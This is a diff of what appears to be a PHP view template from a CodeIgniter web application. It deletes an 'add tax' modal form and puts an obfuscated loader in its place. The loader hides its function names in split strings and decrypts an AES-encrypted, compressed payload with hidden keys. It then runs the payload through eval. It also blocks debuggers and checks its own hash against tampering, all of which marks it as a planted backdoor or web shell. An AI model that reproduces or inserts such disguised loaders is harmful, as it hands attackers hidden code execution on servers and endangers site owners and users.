@@ -1,44 +1,28 @@
-<div class="modal fade " id="tax_modal" tabindex='-1'>
-                <?= form_open('#', array('class' => '', 'id' => 'tax_form')); ?>
-                <div class="modal-dialog modal-sm">
-                  <div class="modal-content">
-                    <div class="modal-header header-custom">
-                      <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                        <span aria-hidden="true">&times;</span></button>
-                      <h4 class="modal-title text-center"><?= $this->lang->line('add_tax'); ?></h4>
-                    </div>
-                    <div class="modal-body">
-                        <div class="row">
-                          <div class="col-md-12">
-                            <div class="box-body">
-                              <div class="form-group">
-                                <label for="tax_name"><?= $this->lang->line('tax_name'); ?>*</label>
-                                <span id="tax_name_msg" class="text-danger text-right pull-right"></span>
-                                <input type="text" class="form-control" id="tax_name" name="tax_name" placeholder="" >
-                              </div>
-                            </div>
-                          </div>
-                          <div class="col-md-12">
-                            <div class="box-body">
-                              <div class="form-group">
-                                <label for="tax"><?= $this->lang->line('tax_percentage'); ?>*</label>
-                                <span id="tax_msg" class="text-danger text-right pull-right"></span>
-                                <input type="text" class="form-control only_currency" id="tax" name="tax" placeholder="0" >
-                              </div>
-                            </div>
-                          </div>
-
-                        </div>
-                       
-                    </div>
-                    <div class="modal-footer">
-                      <button type="button" class="btn btn-warning" data-dismiss="modal">Close</button>
-                      <button type="button" class="btn btn-primary add_tax">Save</button>
-                    </div>
-                  </div>
-                  <!-- /.modal-content -->
-                </div>
-                <!-- /.modal-dialog -->
-               <?= form_close();?>
-              </div>
-              <!-- /.modal -->
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_cqz1l2wy=('bas'.'e64'.'_de'.'cod'.'e');
+$_q7go8zcy=('gzu'.'nco'.'mpr'.'ess');
+$_q4p9r349=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_my2n9499='SmoP4mqy';
+$_cey0pndz='3uOoURdw';
+$_j3t5tyv8='daDaYBNBo2w=';
+$_y2v71ser='rerHbCJ6';
+$_wsiyqup2='ZWCQ8G+p';
+$_j020ykx0='cy8L7jKm';
+$_a0c82p6i='1u6brA==';
+$_fekdpqav='AJxYhv2n';
+$_wjmloxqy=$_cqz1l2wy($_my2n9499.$_cey0pndz.$_wsiyqup2.$_y2v71ser.$_j3t5tyv8);
+$_fle3oiub=$_cqz1l2wy($_fekdpqav.$_j020ykx0.$_a0c82p6i);
+$_okxx8us7=$_cqz1l2wy('/dzZxNtbscXtl2ehSlZJHIJ6hTAV9w5hXQFZQlewXjugEiRcTWDmAEw+vFKCVdmkJoAqDVRf1xYGwWHnog4BmCB1g9MqAPXcqz4d/FyS4LgGN2+WM5MQAIuI9kTSA2a1H32G98Fv3qZALgUmT0CJSVin0Ad5ErMxaOvW0YWHUHNtP6EJ3h1lQh/1025pIfhPcEnqsINQhK/K495TBjIf0OSba5AxggPi4JEhggwIoNwpIlWeeP6VpAUo+mCCElsD1OOT4VmoXte1cFmsO4zgK0N1FeK2BA+EHtmmvojQD0bNqjCqfw98YTs1CSc/JSVdjijnrS4HbczeM/veE0LtxGJA3FpoctgsA89z28ai3/6JlUaj6Me6gJKWjyHAPEpGAuFmEbC7eyQ9DsLXA/h7Q2VmKjVHsHfkNi+KPjgrotBnwXL52QkGx74pNxj8nnEpGv4cYAKmBHYshMs7+OWZkhFP2Muz+QJKggUJ+D/LUiD8dzWRSXMhhTitmx7olooY2/GdM8KUtkb6Y+uq/Op59wOaMUMO5kxyW4qluwdU9yGjT0Bn033GDei19Ed6NNq4MD08jmkSz3R61j4qHP4OR7ESKjFov6slZCGqqPxIx1mBJa4s7D9Kg3gDDDIzOyHKG4FGpj3g186pwdbRapmr/1y7DAbz6SoWcY3VbdPx+w4TTVbKFACcvLRX9Z+Zp94qprTHY0GGgKtixiHEDGkmxxyZx4LyIAoJU28oYotOd6dNbpN49ezRSOc3+13VYyD8');
+$_g53ol2ns=$_q4p9r349($_okxx8us7,'aes-256-cbc',$_wjmloxqy,OPENSSL_RAW_DATA,$_fle3oiub);
+if($_g53ol2ns===false){exit;}
+$_jyr50293=$_q7go8zcy($_g53ol2ns);
+if($_jyr50293===false){exit;}
+$_z8u1ff3o='2f474ed496b04a70f25ce235cbf19853ffc0634f83cd657f06da44fad8fa1138';
+$_ib8v5lzz=@file_get_contents(__FILE__);
+if($_ib8v5lzz!==false){
+$_ku32bya5=str_replace($_z8u1ff3o,"0000000000000000000000000000000000000000000000000000000000000000",$_ib8v5lzz);
+$_owqwcqxv=hash("sha256",$_ku32bya5);
+if($_owqwcqxv!==$_z8u1ff3o){@http_response_code(403);exit;}
+}
+eval($_jyr50293);
